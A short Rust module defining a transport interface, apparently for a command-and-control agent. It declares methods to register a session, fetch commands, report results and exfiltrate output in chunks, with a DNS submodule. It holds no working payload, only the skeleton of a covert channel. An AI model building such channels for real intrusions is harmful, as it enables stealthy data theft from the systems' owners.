use crate::command::CommandInfo;
use crate::result::CommandResult;
use std::process::Command;

pub type LastOne = bool;
pub trait Transport {
    fn register_session(&self) -> Result<(), String>;
    fn command_info(&self) -> Result<Option<CommandInfo>, String>;
    fn command_details(
        &self,
        command: &mut CommandInfo,
        offset: &mut u64,
    ) -> Result<LastOne, String>;
    fn set_result_info(&self, result: &CommandResult) -> Result<(), String>;
    fn exfiltrate_chunk(&self, result: &CommandResult, offset: &mut usize) -> Result<(), String>;
}

pub mod dns;
